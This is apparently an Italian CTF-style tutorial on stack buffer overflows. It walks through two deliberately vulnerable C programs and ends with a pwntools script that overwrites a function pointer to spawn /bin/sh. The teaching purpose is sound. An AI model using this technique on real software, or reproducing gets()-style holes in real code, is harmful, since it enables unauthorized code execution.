Pwn

Stack:

Lo stack è uno spazio di memoria nel quale vengono memorizzate le variabili e le informazioni di controllo del programma (come i puntatori di ritorno delle funzioni).


Quando viene allocata una nuova variabile, lo spazio per questa viene riservato "in cima" allo stack.
Si può quindi dire che lo stack cresce dal basso verso l'alto.


Il contenuto della variabile viene scritto nel “blocco” ad essa assegnato un po’ come quando si scrive su un foglio: dall’alto verso il basso e da sinistra verso destra.

Buffer overflow

Un buffer overflow sfrutta il fatto che certi linguaggi di programmazione non controllino automaticamente la dimensione dei dati in input.
Se il programmatore non include controlli aggiuntivi è quindi possibile fornire al programma un input più grande del previsto.
L’input viene salvato nell’area di memoria assegnata alla variabile, detta buffer.
Nel caso in cui si riesca a fornire un input più grande del previsto al programma, questo non potrà essere contenuto nella sua interezza all’interno del buffer ed il programma, continuando a scrivere da sinistra verso destra arriverà ad un certo punto a sovrascrivere i contenuti dell’elemento successivo nello stack, qualsiasi cosa esso rappresenti.

Esercizio 1 Pwn

int main(void)
{
    int pass = 0;
    char buff[8];
    

    printf("\n Enter the password : \n");
    gets(buff);

    if(pass)
    {
       /* Now Give root or admin rights to user*/
        printf ("Correct password! \nFlag={hello_world_pwn}\n");
    }
    else{
      printf("Wrong password. Status%d\n", pass);
    }

    return 0;
}

Essendo stata creata dopo pass, la variabile buff finisce “in cima” allo stack.
Per passare la condizione dell’if è sufficiente che
pass abbia un valore ≠ 0.
Bisogna quindi inserire un input che riempia
buff e faccia overflow in pass con il valore corretto

Soluzione

Per qualsiasi lettera inserita, verrà salvato il valore corrispondente alla sua rappresentazione ascii.
È sufficiente quindi scrivere una lettera qualsiasi per 9 volte (o anche un numero ≠ 0).

Esercizio 3 Pwn

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

struct programmer_t
{
    char favourite_lang[32];
    void (*call)();
};
typedef struct programmer_t programmer_t;

void python()
{
    printf("Maybe you want a python shell...\n");
    sleep(3);
    execlp("/bin/sh", "/bin/sh", "-c", "echo 'python shell'", NULL);
}

void bash()
{
    printf("Opening bash shell...\n");
    sleep(3);
    printf("are you sure you don't prefer java?\n");
    if(rand() != 328347) return; //non sarà mai vero
    // if only there was a way to jump here...
    execlp("/bin/sh", "/bin/sh", NULL);
}

void nothing()
{
    execlp("/bin/sh", "/bin/sh", "-c", "", NULL);
}


int main(int argc, char** argv)
{
    programmer_t user = {0};
    
    printf("Enter your favourite programming language: ");
    fflush(stdout);
    int i = 0;
    char c;
    while ((c = getchar()) != '\n')
        user.favourite_lang[i++] = c;
    
    if(!strncmp(user.favourite_lang, "java", 4)) {
        printf("Just another Java noob...\n");
    }
    else if (!strncmp(user.favourite_lang, "python", 6)) {
        user.call = python;
    }
    else if (!strncmp(user.favourite_lang, "bash", 4)) {
        user.call = bash;
    }
    else {
        user.call = nothing;
    }
    if(user.call) user.call();
    return 0;
}

Lo scopo di questo esercizio è aprire una shell, ossia eseguire il comando /bin/sh.
Per farlo dobbiamo osservare la funzione
void bash().

È presente una riga che fa esattamente quello che ci serve, ossia
execlp("/bin/sh", "/bin/sh", NULL);.
Come si può vedere però, questa riga non verrà mai eseguita in quanto c’è un
returnche viene eseguito prima.
Dobbiamo quindi trovare un modo di saltare alla riga corretta, sfruttando il modo in cui il programma prende l’input.

void bash()
{
    printf("Opening bash shell...\n");
    sleep(3);
    printf("are you sure you don't prefer java?\n");
    if(rand() != 328347) return; //sempre vero
    // if only there was a way to jump here...
    execlp("/bin/sh", "/bin/sh", NULL);

In questo esercizio è presente la struct:

struct programmer_t
{
    char favourite_lang[32];
    void (*call)(); 
};

void (*call)(); trasforma la variabile in una funzione e la chiama.
Nel codice,
user.call=... viene usato per trasformare ... in una funzione.

Potremmo fare buffer overflow della variabile
favourite_lang in modo da sovrascrivere void (*call)(); con un indirizzo a nostro piacimento


Osservando il main possiamo notare che se
favorite_lang è uguale a python, bash o nothing viene chiamata la corrispettiva funzione; per java invece non viene fatto nulla.


Se il programma non legge “java” nei primi 4 caratteri inseriti, andrà quindi a sovrascrivere la variabile
call (dentro la struct user).
Questo avviene dopo la raccolta dell’input quindi renderebbe vano il nostro overflow realizzato con tanta cura 😢.

Per ovviare al problema dobbiamo assicurarci che le prime 4 lettere dell’input da noi inserito siano “java”.
Il resto delle lettere potranno essere casuali, basta che riempiano il buffer.
Infine, una volta riempito il buffer, dobbiamo scrivere l’indirizzo di memoria della riga a cui vogliamo saltare.

int main(int argc, char** argv)
{
    programmer_t user = {0};
    
    printf("Enter your favourite programming language: ");
    fflush(stdout);
    int i = 0;
    char c;
    while ((c = getchar()) != '\n')
        user.favourite_lang[i++] = c;
    
    if(!strncmp(user.favourite_lang, "java", 4)) {
        printf("Just another Java noob...\n");
    }
    else if (!strncmp(user.favourite_lang, "python", 6)) {
        user.call = python;
    }
    else if (!strncmp(user.favourite_lang, "bash", 4)) {
        user.call = bash;
    }
    else {
        user.call = nothing;
    }
    if(user.call) user.call();
    return 0;
}

Per risolvere il problema conviene realizzare uno script python, tecnicamente è sufficiente scrivere le giuste lettere su un terminale però questa volta dovremmo scrivere un indirizzo di memoria e la libreria pwn per python ha un comando comodissimo per farlo.

L’indirizzo di memoria infatti viene mostrato in esadecimale da ghidra/ida/gdb, la funzione pwn.p64 ci consente di convertirlo automaticamente in byte.

import pwn

p = pwn.process("./java")
p.sendline(
	b"java" + #condizione iniziale per non avere "user.call" sovrascritto 
	b"A"*28 + # byte di buffer overflow
            # (devono essere uguali alla dimensione del buffer (32) => java (4 caratteri) + 28 volte "A")
	pwn.p64(0x4007a2) #indirizzo trovato con GDB o GHIDRA (vedi sotto) [*1]
)

p.interactive()

[*1] L’indirizzo 0x4007a2 è l’indirizzo della funzione execlp (nella funzione void bash()) ed è stato ottenuto decompilando il programma java usando GDB (Ghidra e IDA vanno altrettanto bene).
